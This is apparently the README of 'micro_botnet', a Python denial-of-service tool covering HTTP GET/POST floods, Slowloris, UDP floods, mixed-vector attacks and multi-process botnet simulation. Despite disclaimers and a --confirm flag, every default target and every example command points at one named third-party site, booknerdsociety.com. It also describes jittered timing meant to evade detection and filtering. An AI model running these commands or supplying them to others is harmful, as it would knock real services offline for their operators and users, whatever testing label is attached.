# micro_botnet

## Abstract

micro_botnet is a distributed load testing and network stress simulation tool designed for security researchers, system administrators, and developers to evaluate the resilience and performance characteristics of web infrastructure under various attack patterns. The tool implements multiple attack vectors including HTTP GET/POST floods, Slowloris-style connection exhaustion, UDP packet floods, and mixed-mode attacks. It supports configurable attack patterns and can simulate distributed botnet behavior through local process spawning.

This tool is intended exclusively for authorized testing against systems owned or explicitly permitted by the operator. Unauthorized use against systems without explicit permission is illegal and unethical.

## Architecture

The tool is implemented in Python 3 using asynchronous I/O (asyncio) for high-concurrency request handling and multiprocessing for distributed node simulation. The architecture consists of:

- Asynchronous HTTP workers for GET and POST request flooding
- Synchronous Slowloris workers for connection exhaustion attacks
- Asynchronous UDP workers for packet flooding
- Pattern configuration system for attack-style modulation
- Multiprocessing spawner for distributed node simulation

## Operational Modes

### HTTP GET Flood

Executes asynchronous HTTP GET requests against a target URL. This mode is useful for testing server capacity under read-heavy workloads.

**Usage:**
```
python3 micro_botnet.py --mode http-get --target <URL> --concurrency <N> --requests-per-worker <M> --attack-style <STYLE> --confirm
```

### HTTP POST Flood

Executes asynchronous HTTP POST requests with configurable JSON payloads. This mode tests server capacity under write-heavy workloads and request processing overhead.

**Usage:**
```
python3 micro_botnet.py --mode http-post --target <URL> --concurrency <N> --requests-per-worker <M> --payload-size <SIZE> --attack-style <STYLE> --confirm
```

### Slowloris

Implements a Slowloris-style attack by establishing multiple TCP connections and maintaining them in a partially-open state through periodic keep-alive headers. This exhausts server connection pools without consuming significant bandwidth.

**Usage:**
```
python3 micro_botnet.py --mode slowloris --host <HOST> --port <PORT> --sockets-per-worker <N> --hold-time <SECONDS> --send-interval <SECONDS> --confirm
```

### UDP Flood

Sends UDP packets to a target host and port. This mode tests network infrastructure and UDP service resilience.

**Usage:**
```
python3 micro_botnet.py --mode udp-flood --host <HOST> --port <PORT> --concurrency <N> --udp-packets-per-worker <M> --payload-size <SIZE> --attack-style <STYLE> --confirm
```

### Mixed Mode

Concurrently executes HTTP GET, HTTP POST, and UDP flood attacks. This simulates a multi-vector attack scenario.

**Usage:**
```
python3 micro_botnet.py --mode mixed --target <URL> --host <HOST> --port <PORT> --concurrency <N> --requests-per-worker <M> --attack-style <STYLE> --confirm
```

### Spawn Nodes

Spawns multiple local processes, each executing a mixed-mode attack. This simulates distributed botnet behavior across multiple nodes.

**Usage:**
```
python3 micro_botnet.py --mode spawn-nodes --nodes <N> --target <URL> --concurrency <C> --requests-per-worker <M> --attack-style <STYLE> --confirm
```

## Attack Style Patterns

The tool supports five attack pattern styles that modulate request timing and distribution:

### Slowloris Pattern

Maintains connections in a partially-open state with periodic keep-alive headers. This pattern is primarily used with the slowloris mode but can influence other modes' connection behavior.

### Rapid Pattern

Minimizes delay between requests to achieve maximum request velocity. The delay between requests is configurable via `--rapid-delay` (default: 0.001 seconds).

### Burst Pattern

Sends groups of requests in rapid succession followed by a pause period. Burst size and pause duration are configurable via `--burst-size` (default: 50) and `--burst-pause` (default: 1.0 seconds).

### Drip Pattern

Maintains a low, steady request rate over time to simulate slow resource exhaustion. The delay between requests is configurable via `--drip-delay` (default: 0.5 seconds).

### Mixed Pattern

Randomly selects from rapid, burst, and drip patterns per worker, creating unpredictable attack behavior.

## Command-Line Parameters

### Mode Selection

- `--mode`: Operational mode. Choices: `http-get`, `http-post`, `slowloris`, `udp-flood`, `mixed`, `spawn-nodes`. Default: `http-get`

### Target Configuration

- `--target`: Target URL for HTTP modes (must include http:// or https://). Default: `https://booknerdsociety.com`
- `--host`: Target hostname or IP address for UDP/slowloris modes. Default: `booknerdsociety.com`
- `--port`: Target port for slowloris/udp modes. Default: `80`

### Concurrency and Volume

- `--concurrency`: Number of concurrent workers (async tasks). Default: `50`
- `--requests-per-worker`: Number of requests each worker will send. Default: `10`
- `--udp-packets-per-worker`: Number of UDP packets each worker will send. Default: `20`
- `--sockets-per-worker`: Number of sockets each slowloris worker will create. Default: `50`

### Attack Style Configuration

- `--attack-style`: Attack pattern style. Choices: `slowloris`, `rapid`, `burst`, `drip`, `mixed`. Default: `mixed`
- `--burst-size`: Number of requests in one burst (burst pattern). Default: `50`
- `--burst-pause`: Pause duration after each burst in seconds (burst pattern). Default: `1.0`
- `--rapid-delay`: Base delay between requests in seconds (rapid pattern). Default: `0.001`
- `--drip-delay`: Base delay between requests in seconds (drip pattern). Default: `0.5`

### Slowloris-Specific Parameters

- `--hold-time`: Duration in seconds that slowloris maintains connections. Default: `60`
- `--send-interval`: Interval between keep-alive header sends in seconds. Default: `10.0`

### Payload Configuration

- `--payload-size`: Size of random payload for POST/UDP requests in bytes. Default: `64`

### Distributed Node Configuration

- `--nodes`: Number of local processes to spawn (spawn-nodes mode). Default: `1`

### Safety

- `--confirm`: Required flag to execute the attack simulation. Without this flag, the tool will exit without performing any operations.

## Example Commands

### Burst Pattern with Multiple Nodes

Spawn three distributed nodes executing burst-style attacks with high concurrency:

```
python3 micro_botnet.py --mode spawn-nodes --nodes 3 --concurrency 100 --requests-per-worker 40 --attack-style burst --burst-size 100 --burst-pause 1.5 --target https://booknerdsociety.com --confirm
```

### Rapid HTTP GET Attack

Single-process rapid HTTP GET flood with high concurrency:

```
python3 micro_botnet.py --mode http-get --concurrency 200 --requests-per-worker 50 --attack-style rapid --rapid-delay 0.002 --target https://booknerdsociety.com --confirm
```

### Drip Pattern POST Attack

Low-rate POST flood using drip pattern:

```
python3 micro_botnet.py --mode http-post --concurrency 50 --requests-per-worker 20 --attack-style drip --drip-delay 1.0 --target https://booknerdsociety.com --confirm
```

### Mixed Pattern Multi-Vector Attack

Concurrent GET, POST, and UDP attacks with mixed timing patterns:

```
python3 micro_botnet.py --mode mixed --concurrency 100 --requests-per-worker 30 --attack-style mixed --target https://booknerdsociety.com --host booknerdsociety.com --port 80 --confirm
```

### Slowloris Connection Exhaustion

Maintain 200 connections for 120 seconds:

```
python3 micro_botnet.py --mode slowloris --host booknerdsociety.com --port 80 --sockets-per-worker 200 --hold-time 120 --send-interval 15.0 --confirm
```

## Safety and Legal Considerations

This tool is designed exclusively for authorized security testing and performance evaluation. The following restrictions apply:

1. Only test against systems you own or have explicit written permission to test
2. The `--confirm` flag is required to execute any attack simulation
3. Default parameters are conservative; increase load gradually
4. Unauthorized use against systems without permission may violate computer fraud and abuse laws
5. The authors and contributors assume no liability for misuse of this tool

## Technical Requirements

- Python 3.6 or higher
- aiohttp library for asynchronous HTTP operations
- Standard library modules: asyncio, argparse, socket, multiprocessing, random, string, time, sys

Install dependencies:
```
pip install aiohttp
```

## Implementation Notes

The tool uses asyncio for concurrent request handling, allowing high-throughput operations with minimal resource consumption. Pattern configuration is implemented through the `PatternConfig` class, which encapsulates timing parameters and provides jittered delays to avoid perfectly synchronized behavior that could be easily detected or filtered.

The spawn-nodes mode uses Python's multiprocessing module to create independent processes, each executing a full attack cycle. This simulates distributed botnet behavior where multiple nodes coordinate attacks independently.

## Output

The tool provides real-time feedback including:
- Mode and configuration summary
- Per-node status (in spawn-nodes mode)
- Success and failure counts for HTTP operations
- Total execution time
- Socket creation and maintenance statistics (slowloris mode)

## Limitations

- All nodes in spawn-nodes mode execute on the local machine, limiting true distribution simulation
- Network bandwidth and system resources constrain maximum achievable load
- Some attack patterns may be mitigated by modern web application firewalls and DDoS protection services
- UDP flood effectiveness depends on target service configuration and network infrastructure

